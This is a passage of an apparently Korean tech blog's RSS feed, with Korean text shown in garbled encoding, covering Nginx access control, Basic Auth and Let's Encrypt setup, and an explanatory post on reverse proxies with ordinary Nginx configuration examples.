class="number">10.0.0.1</span>;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># GeoIP ê¸°ë°˜ ì°¨ë‹¨ (ëª¨ë“ˆ í•„ìš”)</span></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$geoip_country_code</span> <span class="regexp">~ (CN|RU))</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Basic-Auth-ì„¤ì •"><a href="#4-Basic-Auth-ì„¤ì •" class="headerlink" title="4. Basic Auth ì„¤ì •"></a>4. Basic Auth ì„¤ì •</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># htpasswd íŒŒì¼ ìƒì„±</span></span><br><span class="line">sudo apt install apache2-utils</span><br><span class="line">sudo htpasswd -c /etc/nginx/.htpasswd username</span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> /admin &#123;</span><br><span class="line">    <span class="attribute">auth_basic</span> <span class="string">&quot;Restricted Area&quot;</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.htpasswd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Letâ€™s-Encrypt-SSL-ì¸ì¦ì„œ"><a href="#Letâ€™s-Encrypt-SSL-ì¸ì¦ì„œ" class="headerlink" title="Letâ€™s Encrypt SSL ì¸ì¦ì„œ"></a>Letâ€™s Encrypt SSL ì¸ì¦ì„œ</h2><h3 id="Certbot-ì‚¬ìš©"><a href="#Certbot-ì‚¬ìš©" class="headerlink" title="Certbot ì‚¬ìš©"></a>Certbot ì‚¬ìš©</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Certbot ì„¤ì¹˜</span></span><br><span class="line">sudo apt install certbot python3-certbot-nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¸ì¦ì„œ ë°œê¸‰</span></span><br><span class="line">sudo certbot --nginx -d example.com -d www.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìë™ ê°±ì‹  í…ŒìŠ¤íŠ¸</span></span><br><span class="line">sudo certbot renew --dry-run</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cron ì‘ì—…ìœ¼ë¡œ ìë™ ê°±ì‹ </span></span><br><span class="line">0 3 * * * certbot renew --quiet</span><br></pre></td></tr></table></figure><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://nginx.org/en/docs/">ê³µì‹ Nginx ë¬¸ì„œ</a></li><li><a href="https://www.digitalocean.com/community/tools/nginx">Nginx ì„¤ì • ìƒì„±ê¸°</a></li><li><a href="https://www.nginx.com/blog/tuning-nginx/">Nginx ì„±ëŠ¥ íŠœë‹ ê°€ì´ë“œ</a></li><li><a href="https://letsencrypt.org/">Letâ€™s Encrypt</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Infra/">Infra</category>
      
      
      <category domain="https://ckck803.github.io/tags/Nginx/">Nginx</category>
      
      <category domain="https://ckck803.github.io/tags/Web-Server/">Web Server</category>
      
      <category domain="https://ckck803.github.io/tags/Reverse-Proxy/">Reverse Proxy</category>
      
      <category domain="https://ckck803.github.io/tags/Load-Balancer/">Load Balancer</category>
      
      
      <comments>https://ckck803.github.io/2025/12/11/infra/nginx/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Network] Reverse Proxy ë€?</title>
      <link>https://ckck803.github.io/2025/12/11/computer-science/network/reverse-proxy/</link>
      <guid>https://ckck803.github.io/2025/12/11/computer-science/network/reverse-proxy/</guid>
      <pubDate>Thu, 11 Dec 2025 14:16:32 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;Reverse-Proxy-ë€&quot;&gt;&lt;a href=&quot;#Reverse-Proxy-ë€&quot; class=&quot;headerlink&quot; title=&quot;Reverse Proxy ë€?&quot;&gt;&lt;/a&gt;Reverse Proxy ë€?&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Reverse Proxy&lt;/strong&gt;ëŠ” í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ë°›ì•„ ë‚´ë¶€ ì„œë²„ë¡œ ì „ë‹¬í•˜ê³ , ì„œë²„ì˜ ì‘ë‹µì„ ë‹¤ì‹œ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ ë°˜í™˜í•˜ëŠ” ì¤‘ê°œ ì„œë²„ì…ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ ì…ì¥ì—ì„œëŠ” Reverse Proxyê°€ ì‹¤ì œ ì„œë²„ì¸ ê²ƒì²˜ëŸ¼ ë³´ì´ë©°, ì‹¤ì œ ë°±ì—”ë“œ ì„œë²„ì˜ ì¡´ì¬ëŠ” ìˆ¨ê²¨ì§‘ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/computer-science/network/reverse-proxy.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Forward-Proxy-vs-Reverse-Proxy&quot;&gt;&lt;a href=&quot;#Forward-Proxy-vs-Reverse-Proxy&quot; class=&quot;headerlink&quot; title=&quot;Forward Proxy vs Reverse Proxy&quot;&gt;&lt;/a&gt;Forward Proxy vs Reverse Proxy&lt;/h2&gt;&lt;h3 id=&quot;Forward-Proxy&quot;&gt;&lt;a href=&quot;#Forward-Proxy&quot; class=&quot;headerlink&quot; title=&quot;Forward Proxy&quot;&gt;&lt;/a&gt;Forward Proxy&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;í´ë¼ì´ì–¸íŠ¸ ì•ì— ìœ„ì¹˜&lt;/li&gt;
&lt;li&gt;í´ë¼ì´ì–¸íŠ¸ë¥¼ ëŒ€ì‹ í•˜ì—¬ ì„œë²„ì— ìš”ì²­&lt;/li&gt;
&lt;li&gt;í´ë¼ì´ì–¸íŠ¸ì˜ IPë¥¼ ìˆ¨ê¹€&lt;/li&gt;
&lt;li&gt;ì£¼ë¡œ ì¡°ì§ ë‚´ë¶€ì—ì„œ ì™¸ë¶€ ì¸í„°ë„· ì ‘ê·¼ ì œì–´ì— ì‚¬ìš©&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;Reverse-Proxy&quot;&gt;&lt;a href=&quot;#Reverse-Proxy&quot; class=&quot;headerlink&quot; title=&quot;Reverse Proxy&quot;&gt;&lt;/a&gt;Reverse Proxy&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ì„œë²„ ì•ì— ìœ„ì¹˜&lt;/li&gt;
&lt;li&gt;ì„œë²„ë¥¼ ëŒ€ì‹ í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ë°›ìŒ&lt;/li&gt;
&lt;li&gt;ì„œë²„ì˜ IPì™€ êµ¬ì¡°ë¥¼ ìˆ¨ê¹€&lt;/li&gt;
&lt;li&gt;ë¡œë“œ ë°¸ëŸ°ì‹±, ë³´ì•ˆ, ìºì‹± ë“±ì˜ ëª©ì ìœ¼ë¡œ ì‚¬ìš©&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Forward Proxy:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Client] â†’ [Proxy] â†’ [Server]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Reverse Proxy:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Client] â†’ [Reverse Proxy] â†’ [Internal Server 1]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                           â†’ [Internal Server 2]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                           â†’ [Internal Server 3]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Reverse-Proxyì˜-ì£¼ìš”-ê¸°ëŠ¥&quot;&gt;&lt;a href=&quot;#Reverse-Proxyì˜-ì£¼ìš”-ê¸°ëŠ¥&quot; class=&quot;headerlink&quot; title=&quot;Reverse Proxyì˜ ì£¼ìš” ê¸°ëŠ¥&quot;&gt;&lt;/a&gt;Reverse Proxyì˜ ì£¼ìš” ê¸°ëŠ¥&lt;/h2&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Reverse-Proxy-ë€"><a href="#Reverse-Proxy-ë€" class="headerlink" title="Reverse Proxy ë€?"></a>Reverse Proxy ë€?</h2><p><strong>Reverse Proxy</strong>ëŠ” í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ë°›ì•„ ë‚´ë¶€ ì„œë²„ë¡œ ì „ë‹¬í•˜ê³ , ì„œë²„ì˜ ì‘ë‹µì„ ë‹¤ì‹œ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ ë°˜í™˜í•˜ëŠ” ì¤‘ê°œ ì„œë²„ì…ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ ì…ì¥ì—ì„œëŠ” Reverse Proxyê°€ ì‹¤ì œ ì„œë²„ì¸ ê²ƒì²˜ëŸ¼ ë³´ì´ë©°, ì‹¤ì œ ë°±ì—”ë“œ ì„œë²„ì˜ ì¡´ì¬ëŠ” ìˆ¨ê²¨ì§‘ë‹ˆë‹¤.</p><p><img src="/images/computer-science/network/reverse-proxy.png"></p><h2 id="Forward-Proxy-vs-Reverse-Proxy"><a href="#Forward-Proxy-vs-Reverse-Proxy" class="headerlink" title="Forward Proxy vs Reverse Proxy"></a>Forward Proxy vs Reverse Proxy</h2><h3 id="Forward-Proxy"><a href="#Forward-Proxy" class="headerlink" title="Forward Proxy"></a>Forward Proxy</h3><ul><li>í´ë¼ì´ì–¸íŠ¸ ì•ì— ìœ„ì¹˜</li><li>í´ë¼ì´ì–¸íŠ¸ë¥¼ ëŒ€ì‹ í•˜ì—¬ ì„œë²„ì— ìš”ì²­</li><li>í´ë¼ì´ì–¸íŠ¸ì˜ IPë¥¼ ìˆ¨ê¹€</li><li>ì£¼ë¡œ ì¡°ì§ ë‚´ë¶€ì—ì„œ ì™¸ë¶€ ì¸í„°ë„· ì ‘ê·¼ ì œì–´ì— ì‚¬ìš©</li></ul><h3 id="Reverse-Proxy"><a href="#Reverse-Proxy" class="headerlink" title="Reverse Proxy"></a>Reverse Proxy</h3><ul><li>ì„œë²„ ì•ì— ìœ„ì¹˜</li><li>ì„œë²„ë¥¼ ëŒ€ì‹ í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ë°›ìŒ</li><li>ì„œë²„ì˜ IPì™€ êµ¬ì¡°ë¥¼ ìˆ¨ê¹€</li><li>ë¡œë“œ ë°¸ëŸ°ì‹±, ë³´ì•ˆ, ìºì‹± ë“±ì˜ ëª©ì ìœ¼ë¡œ ì‚¬ìš©</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Forward Proxy:</span><br><span class="line">[Client] â†’ [Proxy] â†’ [Server]</span><br><span class="line"></span><br><span class="line">Reverse Proxy:</span><br><span class="line">[Client] â†’ [Reverse Proxy] â†’ [Internal Server 1]</span><br><span class="line">                           â†’ [Internal Server 2]</span><br><span class="line">                           â†’ [Internal Server 3]</span><br></pre></td></tr></table></figure><h2 id="Reverse-Proxyì˜-ì£¼ìš”-ê¸°ëŠ¥"><a href="#Reverse-Proxyì˜-ì£¼ìš”-ê¸°ëŠ¥" class="headerlink" title="Reverse Proxyì˜ ì£¼ìš” ê¸°ëŠ¥"></a>Reverse Proxyì˜ ì£¼ìš” ê¸°ëŠ¥</h2><h3 id="1-ë¡œë“œ-ë°¸ëŸ°ì‹±-Load-Balancing"><a href="#1-ë¡œë“œ-ë°¸ëŸ°ì‹±-Load-Balancing" class="headerlink" title="1. ë¡œë“œ ë°¸ëŸ°ì‹± (Load Balancing)"></a>1. ë¡œë“œ ë°¸ëŸ°ì‹± (Load Balancing)</h3><p>ì—¬ëŸ¬ ë°±ì—”ë“œ ì„œë²„ì— íŠ¸ë˜í”½ì„ ë¶„ì‚°ì‹œì¼œ ë¶€í•˜ë¥¼ ê· ë“±í•˜ê²Œ ë¶„ë°°í•©ë‹ˆë‹¤.</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">server</span> backend1.example.com;</span><br><span class="line">    <span class="attribute">server</span> backend2.example.com;</span><br><span class="line">    <span class="attribute">server</span> backend3.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SSL-TLS-ì¢…ë£Œ-SSL-Termination"><a href="#2-SSL-TLS-ì¢…ë£Œ-SSL-Termination" class="headerlink" title="2. SSL&#x2F;TLS ì¢…ë£Œ (SSL Termination)"></a>2. SSL&#x2F;TLS ì¢…ë£Œ (SSL Termination)</h3><p>HTTPS ë³µí˜¸í™”ë¥¼ Reverse Proxyì—ì„œ ì²˜ë¦¬í•˜ì—¬ ë°±ì—”ë“œ ì„œë²„ì˜ ë¶€ë‹´ì„ ì¤„ì…ë‹ˆë‹¤.</p><ul><li>Reverse Proxyì—ì„œ SSL ì¸ì¦ì„œ ê´€ë¦¬</li><li>ë°±ì—”ë“œ ì„œë²„ëŠ” HTTPë¡œ í†µì‹ í•˜ì—¬ ì„±ëŠ¥ í–¥ìƒ</li><li>ì¤‘ì•™í™”ëœ SSL ì¸ì¦ì„œ ê´€ë¦¬</li></ul><h3 id="3-ìºì‹±-Caching"><a href="#3-ìºì‹±-Caching" class="headerlink" title="3. ìºì‹± (Caching)"></a>3. ìºì‹± (Caching)</h3><p>ì •ì  ì½˜í…ì¸ ë‚˜ ìì£¼ ìš”ì²­ë˜ëŠ” ì‘ë‹µì„ ìºì‹±í•˜ì—¬ ì„±ëŠ¥ì„ í–¥ìƒì‹œí‚µë‹ˆë‹¤.</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_cache_path</span> /data/nginx/cache levels=<span class="number">1</span>:<span class="number">2</span> keys_zone=my_cache:<span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_cache</span> my_cache;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ë³´ì•ˆ-ê°•í™”"><a href="#4-ë³´ì•ˆ-ê°•í™”" class="headerlink" title="4. ë³´ì•ˆ ê°•í™”"></a>4. ë³´ì•ˆ ê°•í™”</h3><ul><li>ì‹¤ì œ ì„œë²„ì˜ IP ì£¼ì†Œì™€ êµ¬ì¡°ë¥¼ ìˆ¨ê¹€</li><li>DDoS ê³µê²© ë°©ì–´</li><li>WAF (Web Application Firewall) í†µí•©</li><li>ì•…ì„± ìš”ì²­ í•„í„°ë§</li></ul><h3 id="5-ì••ì¶•-Compression"><a href="#5-ì••ì¶•-Compression" class="headerlink" title="5. ì••ì¶• (Compression)"></a>5. ì••ì¶• (Compression)</h3><p>ì‘ë‹µ ë°ì´í„°ë¥¼ ì••ì¶•í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ ëŒ€ì—­í­ì„ ì ˆì•½í•©ë‹ˆë‹¤.</p><h3 id="6-ì •ì -ì½˜í…ì¸ -ì œê³µ"><a href="#6-ì •ì -ì½˜í…ì¸ -ì œê³µ" class="headerlink" title="6. ì •ì  ì½˜í…ì¸  ì œê³µ"></a>6. ì •ì  ì½˜í…ì¸  ì œê³µ</h3><p>ì´ë¯¸ì§€, CSS, JavaScript ë“± ì •ì  íŒŒì¼ì„ ì§ì ‘ ì œê³µí•˜ì—¬ ë°±ì—”ë“œ ì„œë²„ì˜ ë¶€ë‹´ì„ ì¤„ì…ë‹ˆë‹¤.</p><h2 id="ëŒ€í‘œì ì¸-Reverse-Proxy-ì†”ë£¨ì…˜"><a href="#ëŒ€í‘œì ì¸-Reverse-Proxy-ì†”ë£¨ì…˜" class="headerlink" title="ëŒ€í‘œì ì¸ Reverse Proxy ì†”ë£¨ì…˜"></a>ëŒ€í‘œì ì¸ Reverse Proxy ì†”ë£¨ì…˜</h2><h3 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="1. Nginx"></a>1. Nginx</h3><ul><li>ë†’ì€ ì„±ëŠ¥ê³¼ ë‚®ì€ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰</li><li>ë¹„ë™ê¸° ì´ë²¤íŠ¸ ê¸°ë°˜ ì•„í‚¤í…ì²˜</li><li>ì •ì  ì½˜í…ì¸  ì œê³µì— íƒì›”</li><li>ê°„ë‹¨í•œ ì„¤ì •</li></ul><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-HAProxy"><a href="#2-HAProxy" class="headerlink" title="2. HAProxy"></a>2. HAProxy</h3><ul><li>ê³ ì„±ëŠ¥ TCP&#x2F;HTTP ë¡œë“œ ë°¸ëŸ°ì„œ</li><li>ê°•ë ¥í•œ ë¡œë“œ ë°¸ëŸ°ì‹± ì•Œê³ ë¦¬ì¦˜</li><li>ìƒì„¸í•œ í—¬ìŠ¤ ì²´í¬ ê¸°ëŠ¥</li><li>ì‹¤ì‹œê°„ í†µê³„ ë° ëª¨ë‹ˆí„°ë§</li></ul><h3 id="3-Apache-HTTP-Server-mod-proxy"><a href="#3-Apache-HTTP-Server-mod-proxy" class="headerlink" title="3. Apache HTTP Server (mod_proxy)"></a>3. Apache HTTP Server (mod_proxy)</h3><ul><li>ì˜¤ë˜ëœ ì—­ì‚¬ì™€ ì•ˆì •ì„±</li><li>ë‹¤ì–‘í•œ ëª¨ë“ˆ ì§€ì›</li><li>ë™ì  ì½˜í…ì¸  ì²˜ë¦¬ì— ìœ ë¦¬</li></ul><h3 id="4-Traefik"><a href="#4-Traefik" class="headerlink" title="4. Traefik"></a>4. Traefik</h3><ul><li>ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ì™€ ì»¨í…Œì´ë„ˆ í™˜ê²½ì— ìµœì í™”</li><li>ìë™ ì„œë¹„ìŠ¤ ë””ìŠ¤ì»¤ë²„ë¦¬</li><li>Letâ€™s Encrypt ìë™ SSL ì¸ì¦ì„œ ë°œê¸‰</li><li>Docker, Kubernetes í†µí•©</li></ul><h3 id="5-AWS-ELB-Elastic-Load-Balancer"><a href="#5-AWS-ELB-Elastic-Load-Balancer" class="headerlink" title="5. AWS ELB (Elastic Load Balancer)"></a>5. AWS ELB (Elastic Load Balancer)</h3><ul><li>AWS í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ ì‚¬ìš©</li><li>ê´€ë¦¬í˜• ì„œë¹„ìŠ¤</li><li>Auto Scalingê³¼ í†µí•©</li></ul><h2 id="Reverse-Proxy-ì‚¬ìš©-ì‚¬ë¡€"><a href="#Reverse-Proxy-ì‚¬ìš©-ì‚¬ë¡€" class="headerlink" title="Reverse Proxy ì‚¬ìš© ì‚¬ë¡€"></a>Reverse Proxy ì‚¬ìš© ì‚¬ë¡€</h2><h3 id="1-ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ì•„í‚¤í…ì²˜"><a href="#1-ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤-ì•„í‚¤í…ì²˜" class="headerlink" title="1. ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜"></a>1. ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Client] â†’ [Reverse Proxy] â†’ [Auth Service]</span><br><span class="line">                           â†’ [User Service]</span><br><span class="line">                           â†’ [Order Service]</span><br><span class="line">                           â†’ [Payment Service]</span><br></pre></td></tr></table></figure><ul><li>API Gateway ì—­í• </li><li>ì„œë¹„ìŠ¤ë³„ ë¼ìš°íŒ…</li><li>ì„œë¹„ìŠ¤ ë””ìŠ¤ì»¤ë²„ë¦¬ì™€ í†µí•©</li></ul><h3 id="2-Blue-Green-ë°°í¬"><a href="#2-Blue-Green-ë°°í¬" class="headerlink" title="2. Blue-Green ë°°í¬"></a>2. Blue-Green ë°°í¬</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> blue &#123;</span><br><span class="line">    <span class="attribute">server</span> blue-app:<span class="number">8080</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">upstream</span> green &#123;</span><br><span class="line">    <span class="attribute">server</span> green-app:<span class="number">8080</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="comment"># íŠ¸ë˜í”½ì„ blue ë˜ëŠ” greenìœ¼ë¡œ ì „í™˜</span></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://blue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-A-B-í…ŒìŠ¤íŒ…"><a href="#3-A-B-í…ŒìŠ¤íŒ…" class="headerlink" title="3. A&#x2F;B í…ŒìŠ¤íŒ…"></a>3. A&#x2F;B í…ŒìŠ¤íŒ…</h3><p>íŠ¹ì • ë¹„ìœ¨ì˜ íŠ¸ë˜í”½ì„ ë‹¤ë¥¸ ë²„ì „ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ìœ¼ë¡œ ë¼ìš°íŒ…</p><h3 id="4-ë©€í‹°-ë„ë©”ì¸-í˜¸ìŠ¤íŒ…"><a href="#4-ë©€í‹°-ë„ë©”ì¸-í˜¸ìŠ¤íŒ…" class="headerlink" title="4. ë©€í‹° ë„ë©”ì¸ í˜¸ìŠ¤íŒ…"></a>4. ë©€í‹° ë„ë©”ì¸ í˜¸ìŠ¤íŒ…</h3><p>í•˜ë‚˜ì˜ Reverse Proxyë¡œ ì—¬ëŸ¬ ë„ë©”ì¸&#x2F;ì• í”Œë¦¬ì¼€ì´ì…˜ ê´€ë¦¬</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> app1.example.com;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://app1:3000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> app2.example.com;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://app2:4000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse-Proxy-ì„¤ì •-ì‹œ-ì£¼ì˜ì‚¬í•­"><a href="#Reverse-Proxy-ì„¤ì •-ì‹œ-ì£¼ì˜ì‚¬í•­" class="headerlink" title="Reverse Proxy ì„¤ì • ì‹œ ì£¼ì˜ì‚¬í•­"></a>Reverse Proxy ì„¤ì • ì‹œ ì£¼ì˜ì‚¬í•­</h2><h3 id="1-Header-ì „ë‹¬"><a href="#1-Header-ì „ë‹¬" class="headerlink" title="1. Header ì „ë‹¬"></a>1. Header ì „ë‹¬</h3><p>í´ë¼ì´ì–¸íŠ¸ì˜ ì‹¤ì œ IP ì£¼ì†Œì™€ í”„ë¡œí† ì½œ ì •ë³´ë¥¼ ë°±ì—”ë“œì— ì „ë‹¬í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br></pre></td></tr></table></figure><h3 id="2-Timeout-ì„¤ì •"><a href="#2-Timeout-ì„¤ì •" class="headerlink" title="2. Timeout ì„¤ì •"></a>2. Timeout ì„¤ì •</h3><p>ê¸´ ìš”ì²­ ì²˜ë¦¬ ì‹œê°„ì„ ê³ ë ¤í•œ ì ì ˆí•œ timeout ì„¤ì •</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_connect_timeout</span> <span class="number">60s</span>;</span><br><span class="line"><span class="attribute">proxy_send_timeout</span> <span class="number">60s</span>;</span><br><span class="line"><span class="attribute">proxy_read_timeout</span> <span class="number">60s</span>;</span><br></pre></td></tr></table></figure><h3 id="3-Buffer-ì„¤ì •"><a href="#3-Buffer-ì„¤ì •" class="headerlink" title="3. Buffer ì„¤ì •"></a>3. Buffer ì„¤ì •</h3><p>ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰ê³¼ ì„±ëŠ¥ ê°„ì˜ ê· í˜•</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_buffering</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">proxy_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line"><span class="attribute">proxy_buffers</span> <span class="number">8</span> <span class="number">4k</span>;</span><br></pre></td></tr></table></figure><h3 id="4-WebSocket-ì§€ì›"><a href="#4-WebSocket-ì§€ì›" class="headerlink" title="4. WebSocket ì§€ì›"></a>4. WebSocket ì§€ì›</h3><p>WebSocket ì—°ê²°ì„ ìœ„í•œ ì¶”ê°€ ì„¤ì •</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> /ws &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;upgrade&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse-Proxyì˜-ì¥ì "><a href="#Reverse-Proxyì˜-ì¥ì " class="headerlink" title="Reverse Proxyì˜ ì¥ì "></a>Reverse Proxyì˜ ì¥ì </h2><ol><li><strong>ë³´ì•ˆ ê°•í™”</strong>: ë‚´ë¶€ ì„œë²„ ì •ë³´ ì€ë‹‰</li><li><strong>í™•ì¥ì„±</strong>: ì‰¬ìš´ ì„œë²„ ì¶”ê°€&#x2F;ì œê±°</li><li><strong>ê°€ìš©ì„±</strong>: ì¥ì•  ë°œìƒ ì‹œ ìë™ failover</li><li><strong>ì„±ëŠ¥ ìµœì í™”</strong>: ìºì‹±, ì••ì¶•, SSL offloading</li><li><strong>ì¤‘ì•™í™”ëœ ê´€ë¦¬</strong>: ë¡œê¹…, ëª¨ë‹ˆí„°ë§, ì¸ì¦ ë“±ì„ í•œ ê³³ì—ì„œ ì²˜ë¦¬</li><li><strong>ìœ ì—°í•œ ë¼ìš°íŒ…</strong>: URL ê¸°ë°˜, í—¤ë” ê¸°ë°˜ ë¼ìš°íŒ…</li></ol><h2 id="Reverse-Proxyì˜-ë‹¨ì "><a href="#Reverse-Proxyì˜-ë‹¨ì " class="headerlink" title="Reverse Proxyì˜ ë‹¨ì "></a>Reverse Proxyì˜ ë‹¨ì </h2><ol><li><strong>Single Point of Failure</strong>: Reverse Proxy ìì²´ê°€ ì¥ì•  ì§€ì ì´ ë  ìˆ˜ ìˆìŒ (HA êµ¬ì„± í•„ìš”)</li><li><strong>ì¶”ê°€ ì§€ì—°</strong>: í•œ ë‹¨ê³„ì˜ ë„¤íŠ¸ì›Œí¬ í™‰ ì¶”ê°€</li><li><strong>ë³µì¡ì„±</strong>: ì„¤ì • ë° ê´€ë¦¬ì˜ ë³µì¡ë„ ì¦ê°€</li><li><strong>ë¹„ìš©</strong>: ì¶”ê°€ ì¸í”„ë¼ ë¹„ìš©</li></ol><h2 